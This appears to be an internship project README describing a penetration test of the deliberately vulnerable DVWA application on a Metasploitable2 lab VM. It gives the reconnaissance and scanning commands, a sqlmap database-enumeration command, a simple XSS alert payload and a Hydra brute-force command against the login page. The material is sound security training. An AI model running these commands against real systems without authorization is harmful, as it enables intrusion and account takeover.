Name: Akash Anil Horambe

Company: CODTECH IT SOLUTIONS

ID : CT08DS5369

Domain: Cyber Security & Ethical Hacking

Duration: July to August 2024

Mentor: Muzammil Ahmed

---

# Penetration Testing on Metasploitable2 DVWA Web Application

This project involves performing penetration testing on a Metasploitable2 DVWA (Damn Vulnerable Web Application) web application to identify and exploit security vulnerabilities such as SQL injection, cross-site scripting (XSS), and insecure authentication mechanisms.

## Table of Contents
- [Overview](#overview)
- [Setup Instructions](#setup-instructions)
- [Reconnaissance](#reconnaissance)
- [Port Scanning](#port-scanning)
- [Vulnerability Scanning](#vulnerability-scanning)
- [Exploitation](#exploitation)

## Overview

Metasploitable2 is a deliberately vulnerable Linux virtual machine intended for testing security tools and demonstrating common vulnerabilities. DVWA is a PHP/MySQL web application that is designed to be vulnerable to various web application attacks, making it a perfect candidate for learning and practicing penetration testing techniques.

## Setup Instructions

1. **Download and Install Metasploitable2:**
   - Download the Metasploitable2 VM from the official [SourceForge page](https://sourceforge.net/projects/metasploitable/files/Metasploitable2/).
   - Import the VM into your preferred virtualization software (e.g., VirtualBox or VMware).

2. **Configure Network Settings:**
   - Ensure the Metasploitable2 VM and your Kali Linux machine are on the same network. This can be done using Host-Only or NAT Network settings.

3. **Start Metasploitable2 VM:**
   - Boot up the Metasploitable2 VM.

4. **Identify IP Address:**
   - Identify the IP address of the Metasploitable2 VM using the command: `ip a`

## Reconnaissance

1. **Identify the Target IP:**
   ```bash
   echo ip 192.168.40.129
   ```

2. **Perform Whois Lookup:**
   ```bash
   whois 192.168.40.129
   ```

3. **DNS Lookup:**
   ```bash
   nslookup 192.168.40.129
   ```

4. **Identify Web Server and Technologies:**
   ```bash
   whatweb 192.168.40.129
   ```

## Port Scanning

1. **Basic Nmap Scan:**
   ```bash
   nmap --help
   ```

2. **Comprehensive Nmap Scan:**
   ```bash
   nmap -sS -sV -O 192.168.40.129
   ```

## Vulnerability Scanning

1. **Run Nmap Vulnerability Scans:**
   ```bash
   nmap --script vuln 192.168.40.129
   ```

2. **Nikto Web Server Scan:**
   ```bash
   nikto -h http://192.168.40.129
   ```

## Exploitation

1. **SQL Injection:**
   - Test for SQL injection vulnerabilities by manipulating the URL parameters and observing the responses.
   - Use SQLMap to automate the detection and exploitation of SQL injection flaws.
     ```bash
     sqlmap -u "http://192.168.40.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --dbs
     ```

2. **Cross-Site Scripting (XSS):**
   - Identify XSS vulnerabilities by injecting scripts into input fields and observing the output.
   - Example payload:
     ```html
     <script>alert('XSS')</script>
     ```

3. **Insecure Authentication Mechanisms:**
   - Test for weak passwords and brute force login attempts.
   - Use tools like Hydra for automating the brute force attacks.
     ```bash
     hydra -l admin -P /path/to/wordlist.txt 192.168.40.129 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
     ```

## Conclusion

This project demonstrates the process of performing penetration testing on a vulnerable web application using various tools and techniques. By identifying and exploiting vulnerabilities, we can understand the importance of securing web applications and the potential risks associated with these common security flaws.

**Note:** This README is intended for educational purposes only. Always obtain proper authorization before performing any penetration testing on a network or system that you do not own.

## License
This project is licensed under the MIT License[LICENSE]. See the LICENSE file for more details.
